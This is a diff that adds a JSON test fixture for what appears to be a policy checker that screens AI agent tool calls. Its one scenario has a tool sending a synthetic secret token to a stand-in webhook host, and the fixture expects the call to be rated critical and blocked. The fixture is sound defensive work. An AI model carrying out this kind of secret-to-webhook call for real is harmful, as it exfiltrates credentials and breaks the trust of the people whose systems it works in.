@@ -1,0 +1,14 @@
+{
+  "scenario": "credential_access",
+  "description": "Credential access combined with an external sink should be critical and blocked.",
+  "checks": [
+    {
+      "tool": "send_secret_to_webhook",
+      "capabilities": ["credential_access", "external_network", "send_message", "webhook_post", "cross_system_exfiltration"],
+      "risk_level": "critical",
+      "policy_decision": "block",
+      "arguments": { "secret_name": "synthetic_token", "webhook_url": "https://hooks.example.test/audit" }
+    }
+  ],
+  "scanner_findings": ["secret", "external_network_sink", "risky_capability"]
+}
